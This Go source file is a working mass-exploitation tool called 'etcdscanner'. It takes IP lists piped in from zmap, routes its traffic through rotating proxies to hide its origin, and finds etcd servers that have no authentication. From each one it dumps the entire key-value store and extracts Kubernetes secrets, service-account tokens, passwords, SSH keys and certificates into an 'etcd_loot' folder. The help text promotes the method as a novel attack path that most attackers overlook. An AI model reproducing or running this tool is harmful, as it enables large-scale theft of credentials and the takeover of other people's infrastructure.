package main

import (
	"bufio"
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

// =============================================================================
// Config
// =============================================================================

var (
	cfgProxiesFile string
	cfgTargetPort  string
	cfgWorkers     int
	cfgTimeout     time.Duration
	cfgOutputDir   string
	cfgDebugFile   string
	debugLog       *log.Logger
	statsTotal     int64
	statsFound     int64
	statsDumped    int64
	statsFailed    int64
)

// =============================================================================
// Proxy Rotation
// =============================================================================

type Proxy struct {
	URL      string
	Host     string
	User     string
	Pass     string
	Failures int32
}

func parseProxy(raw string) (*Proxy, error) {
	p := &Proxy{}
	if !strings.Contains(raw, "://") {
		raw = "http://" + raw
	}
	u, err := url.Parse(raw)
	if err != nil {
		return nil, err
	}
	p.Host = u.Host
	p.URL = raw
	if u.User != nil {
		p.User = u.User.Username()
		p.Pass, _ = u.User.Password()
	}
	return p, nil
}

func loadProxies(filename string) ([]*Proxy, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	var proxies []*Proxy
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		p, err := parseProxy(line)
		if err != nil {
			continue
		}
		proxies = append(proxies, p)
	}
	return proxies, scanner.Err()
}

func proxyDial(proxy *Proxy, target string, timeout time.Duration) (net.Conn, error) {
	dialer := net.Dialer{Timeout: timeout}
	conn, err := dialer.Dial("tcp", proxy.Host)
	if err != nil {
		return nil, fmt.Errorf("proxy dial: %v", err)
	}
	req, err := http.NewRequest("CONNECT", "http://"+target, nil)
	if err != nil {
		conn.Close()
		return nil, err
	}
	req.Host = target
	if proxy.User != "" && proxy.Pass != "" {
		req.Header.Set("Proxy-Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(proxy.User+":"+proxy.Pass)))
	}
	conn.SetWriteDeadline(time.Now().Add(timeout))
	if err := req.Write(conn); err != nil {
		conn.Close()
		return nil, fmt.Errorf("CONNECT write: %v", err)
	}
	conn.SetReadDeadline(time.Now().Add(timeout))
	resp, err := http.ReadResponse(bufio.NewReader(conn), req)
	if err != nil {
		conn.Close()
		return nil, fmt.Errorf("CONNECT read: %v", err)
	}
	resp.Body.Close()
	if resp.StatusCode != 200 {
		conn.Close()
		return nil, fmt.Errorf("proxy returned %d %s", resp.StatusCode, resp.Status)
	}
	return conn, nil
}

type ProxyPool struct {
	mu      sync.Mutex
	proxies []*Proxy
	index   int
}

func newProxyPool(proxies []*Proxy) *ProxyPool {
	return &ProxyPool{proxies: proxies}
}

func (p *ProxyPool) next() *Proxy {
	p.mu.Lock()
	defer p.mu.Unlock()
	if len(p.proxies) == 0 {
		return nil
	}
	for i := 0; i < len(p.proxies); i++ {
		px := p.proxies[p.index]
		p.index = (p.index + 1) % len(p.proxies)
		if atomic.LoadInt32(&px.Failures) < 5 {
			return px
		}
	}
	for _, px := range p.proxies {
		atomic.StoreInt32(&px.Failures, 0)
	}
	return p.proxies[0]
}

func (p *ProxyPool) markFailed(proxy *Proxy) {
	atomic.AddInt32(&proxy.Failures, 1)
}

// =============================================================================
// etcd HTTP Client (through proxy tunnel)
// =============================================================================

func etcdRequest(proxy *Proxy, target, path string) (int, []byte, error) {
	targetAddr := fmt.Sprintf("%s:%s", target, cfgTargetPort)
	conn, err := proxyDial(proxy, targetAddr, cfgTimeout)
	if err != nil {
		return 0, nil, err
	}
	defer conn.Close()

	req, err := http.NewRequest("GET", "http://"+targetAddr+path, nil)
	if err != nil {
		return 0, nil, err
	}
	req.Header.Set("User-Agent", "etcd-client/3.x")
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Connection", "close")

	conn.SetWriteDeadline(time.Now().Add(cfgTimeout))
	if err := req.Write(conn); err != nil {
		return 0, nil, err
	}

	conn.SetReadDeadline(time.Now().Add(cfgTimeout))
	resp, err := http.ReadResponse(bufio.NewReader(conn), req)
	if err != nil {
		return 0, nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	return resp.StatusCode, body, err
}

// =============================================================================
// etcd Detection & Exploitation
// =============================================================================

func detectEtcd(target string, proxy *Proxy) bool {
	// try /version first (most reliable)
	for _, path := range []string{"/version", "/health", "/v2/keys/"} {
		status, body, err := etcdRequest(proxy, target, path)
		if err != nil {
			continue
		}
		s := string(body)
		if status == 200 && (strings.Contains(s, "etcdserver") || strings.Contains(s, "etcdcluster") ||
			strings.Contains(s, `"health"`) || strings.Contains(s, `"node"`) || strings.Contains(s, `"nodes"`)) {
			return true
		}
	}
	return false
}

func dumpEtcd(target string, proxy *Proxy) (string, error) {
	status, body, err := etcdRequest(proxy, target, "/v2/keys/?recursive=true")
	if err != nil {
		return "", err
	}
	if status == 200 {
		return string(body), nil
	}
	// try without recursive
	status, body, err = etcdRequest(proxy, target, "/v2/keys/")
	if err != nil {
		return "", err
	}
	if status == 200 {
		return string(body), nil
	}
	return "", fmt.Errorf("etcd dump failed: status %d", status)
}

func extractSecrets(data string) []string {
	var secrets []string
	// Kubernetes secrets: /registry/secrets/
	re := regexp.MustCompile(`"key"\s*:\s*"(/registry/secrets/[^"]+)"`)
	for _, m := range re.FindAllStringSubmatch(data, -1) {
		if len(m) > 1 {
			secrets = append(secrets, m[1])
		}
	}
	// Service account tokens: /registry/serviceaccounts/
	re2 := regexp.MustCompile(`"key"\s*:\s*"(/registry/serviceaccounts/[^"]+)"`)
	for _, m := range re2.FindAllStringSubmatch(data, -1) {
		if len(m) > 1 {
			secrets = append(secrets, m[1])
		}
	}
	// Any value with token/password/secret/key/cert markers
	patterns := []string{`token`, `password`, `secret`, `-----BEGIN`, `ssh-rsa`, `-----END`}
	for _, pat := range patterns {
		re3 := regexp.MustCompile(`(?i)"value"\s*:\s*"([^"]*` + pat + `[^"]*)"`)
		for _, m := range re3.FindAllStringSubmatch(data, -1) {
			if len(m) > 1 && len(m[1]) > 10 && len(m[1]) < 5000 {
				secrets = append(secrets, "VALUE:"+m[1][:min(200, len(m[1]))])
			}
		}
	}
	return secrets
}

func saveDump(target, data string, secrets []string) {
	os.MkdirAll(cfgOutputDir, 0755)
	safeIP := strings.ReplaceAll(target, ":", "_")
	filename := fmt.Sprintf("%s/%s.json", cfgOutputDir, safeIP)
	os.WriteFile(filename, []byte(data), 0644)

	if len(secrets) > 0 {
		secFile := fmt.Sprintf("%s/%s_secrets.txt", cfgOutputDir, safeIP)
		os.WriteFile(secFile, []byte(strings.Join(secrets, "\n")), 0644)
	}
}

// =============================================================================
// Scanner Worker
// =============================================================================

func scanWorker(ctx context.Context, proxyPool *ProxyPool, targetChan <-chan string, resultChan chan<- string) {
	for {
		select {
		case <-ctx.Done():
			return
		case target, ok := <-targetChan:
			if !ok {
				return
			}
			atomic.AddInt64(&statsTotal, 1)

			proxy := proxyPool.next()
			if proxy == nil {
				debugLog.Printf("No proxies available, skipping %s", target)
				continue
			}

			if !detectEtcd(target, proxy) {
				debugLog.Printf("Not etcd: %s", target)
				continue
			}
			atomic.AddInt64(&statsFound, 1)

			data, err := dumpEtcd(target, proxy)
			if err != nil {
				atomic.AddInt64(&statsFailed, 1)
				debugLog.Printf("Dump failed %s: %v", target, err)
				continue
			}
			atomic.AddInt64(&statsDumped, 1)

			secrets := extractSecrets(data)
			saveDump(target, data, secrets)

			select {
			case resultChan <- fmt.Sprintf("%s [%d secrets]\n", target, len(secrets)):
			case <-ctx.Done():
				return
			}
			debugLog.Printf("OK %s keys=%d secrets=%d", target, strings.Count(data, `"key"`), len(secrets))
		}
	}
}

// =============================================================================
// Helpers
// =============================================================================

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func printStats(ctx context.Context) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			t := time.Now().Format("15:04:05")
			fmt.Printf("\r[%s] Total: %d | Found: %d | Dumped: %d | Failed: %d\n",
				t,
				atomic.LoadInt64(&statsTotal),
				atomic.LoadInt64(&statsFound),
				atomic.LoadInt64(&statsDumped),
				atomic.LoadInt64(&statsFailed))
		}
	}
}

func resultWriter(ctx context.Context, resultChan <-chan string, filename string) {
	f, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		fmt.Printf("Error opening %s: %v\n", filename, err)
		return
	}
	defer f.Close()
	writer := bufio.NewWriter(f)
	for {
		select {
		case <-ctx.Done():
			writer.Flush()
			return
		case line, ok := <-resultChan:
			if !ok {
				writer.Flush()
				return
			}
			writer.WriteString(line)
			writer.Flush()
		}
	}
}

// =============================================================================
// Main
// =============================================================================

func main() {
	flagProxies := "proxies.txt"
	flagPort := "2379"
	flagWorkers := 1000
	flagTimeout := 8
	flagOutputDir := "etcd_loot"
	flagDebug := "etcd_debug.log"
	flagHelp := false

	args := os.Args[1:]
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--proxies":
			i++
			if i < len(args) {
				flagProxies = args[i]
			}
		case "--port":
			i++
			if i < len(args) {
				flagPort = args[i]
			}
		case "--workers":
			i++
			if i < len(args) {
				fmt.Sscanf(args[i], "%d", &flagWorkers)
			}
		case "--timeout":
			i++
			if i < len(args) {
				fmt.Sscanf(args[i], "%d", &flagTimeout)
			}
		case "--output-dir":
			i++
			if i < len(args) {
				flagOutputDir = args[i]
			}
		case "--debug":
			i++
			if i < len(args) {
				flagDebug = args[i]
			}
		case "--help", "-h":
			flagHelp = true
		default:
			fmt.Printf("Unknown flag: %s\n", args[i])
			return
		}
	}

	if flagHelp {
		fmt.Println("Usage: etcdscanner [flags]")
		fmt.Println()
		fmt.Println("Scans for exposed etcd (port 2379) with no authentication.")
		fmt.Println("Dumps entire key-value store via v2 REST API including:")
		fmt.Println("  - Kubernetes secrets (service account tokens, passwords)")
		fmt.Println("  - TLS certificates, SSH keys, cloud credentials")
		fmt.Println("  - All cluster configuration and state")
		fmt.Println()
		fmt.Println("Why this is novel:")
		fmt.Println("  - Most attackers target Kubernetes API (6443), not etcd directly")
		fmt.Println("  - v2 REST API requires no tools - just HTTP GET")
		fmt.Println("  - Returns JSON with ALL secrets in cleartext")
		fmt.Println("  - Can read, write, and delete cluster state")
		fmt.Println()
		fmt.Println("Flags:")
		fmt.Println("  --proxies <file>     Proxy list (default: proxies.txt)")
		fmt.Println("  --port <port>        etcd client port (default: 2379)")
		fmt.Println("  --workers <n>        Concurrent workers (default: 1000)")
		fmt.Println("  --timeout <sec>      Connection timeout (default: 8)")
		fmt.Println("  --output-dir <dir>   Directory for dumped KV data (default: etcd_loot)")
		fmt.Println("  --debug <file>       Debug log (default: etcd_debug.log)")
		fmt.Println("  --help, -h           Show this help")
		fmt.Println()
		fmt.Println("Example:")
		fmt.Println(`  zmap -p 2379 | awk '{print $1}' | etcdscanner --proxies proxies.txt`)
		return
	}

	if flagWorkers < 1 || flagTimeout < 1 {
		fmt.Println("ERROR: workers and timeout must be positive integers")
		return
	}

	cfgProxiesFile = flagProxies
	cfgTargetPort = flagPort
	cfgWorkers = flagWorkers
	cfgTimeout = time.Duration(flagTimeout) * time.Second
	cfgOutputDir = flagOutputDir
	cfgDebugFile = flagDebug

	f, err := os.OpenFile(cfgDebugFile, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		log.Fatal("Failed to open debug log:", err)
	}
	debugLog = log.New(io.MultiWriter(f, os.Stdout), "[DEBUG] ", log.LstdFlags)

	runtime.GOMAXPROCS(runtime.NumCPU())

	proxies, err := loadProxies(cfgProxiesFile)
	if err != nil {
		fmt.Printf("Error loading proxies: %v\n", err)
		return
	}
	if len(proxies) == 0 {
		fmt.Println("No proxies loaded. Create proxies.txt with ip:port per line.")
		return
	}
	fmt.Printf("Loaded %d proxies\n", len(proxies))
	fmt.Printf("Target port: %s\n", cfgTargetPort)
	fmt.Printf("Output dir: %s\n", cfgOutputDir)
	fmt.Println()

	proxyPool := newProxyPool(proxies)
	os.MkdirAll(cfgOutputDir, 0755)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		fmt.Println("\n[CTRL+C] Shutting down gracefully...")
		cancel()
	}()

	targetChan := make(chan string, cfgWorkers*2)
	resultChan := make(chan string, 1000)

	go printStats(ctx)
	go resultWriter(ctx, resultChan, "etcd_loaded.txt")

	var wg sync.WaitGroup
	for i := 0; i < cfgWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			scanWorker(ctx, proxyPool, targetChan, resultChan)
		}()
	}

	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		for scanner.Scan() {
			select {
			case <-ctx.Done():
				return
			default:
				ip := strings.TrimSpace(scanner.Text())
				if ip != "" {
					select {
					case targetChan <- ip:
					case <-ctx.Done():
						return
					}
				}
			}
		}
		close(targetChan)
	}()

	wg.Wait()
	close(resultChan)

	fmt.Printf("\n\n[DONE] Total: %d | Found: %d | Dumped: %d | Failed: %d\n",
		atomic.LoadInt64(&statsTotal),
		atomic.LoadInt64(&statsFound),
		atomic.LoadInt64(&statsDumped),
		atomic.LoadInt64(&statsFailed))
	fmt.Printf("Loot saved to: %s/\n", cfgOutputDir)
}
